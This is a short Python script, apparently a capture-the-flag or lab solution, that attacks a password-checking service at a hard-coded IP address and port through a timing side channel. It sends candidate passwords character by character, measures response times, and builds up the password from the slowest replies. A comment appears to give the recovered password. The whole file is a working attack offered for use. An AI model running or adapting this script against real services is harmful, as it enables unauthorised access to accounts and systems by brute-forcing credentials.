import requests
import string
import json
import time

URL = "http://141.85.224.119:7777"
data = {"password": "XXXXX"} # gmABy
headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}


KNOWN_PASSWORD = ""
ALPHABET = string.ascii_letters + string.digits


response = requests.post(URL, json=data)
print(response.text)

max_time = 0
max_char = ''


while response.text == "Wrong password":
    
    for char in ALPHABET:
        
        temp_password = KNOWN_PASSWORD + char + ((5-len(KNOWN_PASSWORD) - 1) * 'X')
        data = {"password": temp_password}
        
        time.sleep(0.5)
        
        response = requests.post(URL, data=json.dumps(data), headers=headers)
        req_time = response.elapsed.total_seconds()
        print (f"{temp_password} -> {req_time}")
        if response.text != "Wrong password":
            print(response.text)
        if(req_time > max_time and char not in  KNOWN_PASSWORD):
            max_time = req_time
            max_char = char

    KNOWN_PASSWORD += max_char
    print("Current password: ", KNOWN_PASSWORD)
    
print(response.text)
